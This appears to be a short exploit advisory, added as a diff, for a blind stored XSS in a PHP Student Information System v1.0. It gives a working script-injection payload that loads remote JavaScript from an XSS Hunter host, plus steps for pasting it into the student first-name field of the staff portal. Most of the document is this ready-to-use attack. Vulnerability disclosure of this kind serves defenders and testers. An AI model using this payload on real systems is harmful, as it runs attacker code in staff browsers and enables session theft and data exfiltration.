@@ -1,0 +1,18 @@
+# Exploit Title: Student Information System - Blind XSS
+# Exploit Author: NS Kumar (n1_x)
+# Vendor Homepage: https://www.sourcecodester.com/php/15147/simple-student-information-system-phpoop-free-source-code.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/sis_0_1.zip
+# Version: v1.0
+# Tested on: Parrot GNU/Linux 4.10, Apache
+# CVE: ytd
+
+- Description:
+A Blind XSS issue in Student Information System v.1.0 allows to inject JavaScript via add /Student.
+
+- Payload used:
+"><script src=https://d4.xss.ht></script>
+
+- Steps to reproduce:
+1- Go to http://victim.com
+2- In "staff portal" option, paste the payload in student first name.
+3- Then goto your xss hunter, You will see xss fires alert.
